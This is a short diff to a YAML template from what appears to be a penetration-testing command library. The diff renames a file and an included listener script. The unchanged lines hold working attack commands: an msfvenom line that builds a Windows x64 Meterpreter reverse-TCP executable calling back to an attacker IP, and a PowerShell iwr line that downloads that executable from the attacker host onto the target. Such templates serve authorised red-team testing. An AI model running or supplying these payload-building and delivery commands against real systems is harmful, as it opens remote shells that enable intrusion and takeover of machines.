@@ -1,6 +1,6 @@
 ---
 metadata:
-  filename: "deliver-windows-x64-revshell-msfvenom-meterpreter-staged-exe.yaml"
+  filename: "deliver-windows-x64-revshell-msfvenom-meterpreter-tcp-staged-exe.yaml"
   tags: ["shell", "windows"]
   created: "2025-03-29"
   authors: ["Unknown"]
@@ -10,7 +10,7 @@ content: |
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
   echo '================================================================'; \
   echo '                      ------Listener------                      '; \
-  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-staged.yaml') }}'; \
+  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-tcp-staged.yaml') }}'; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
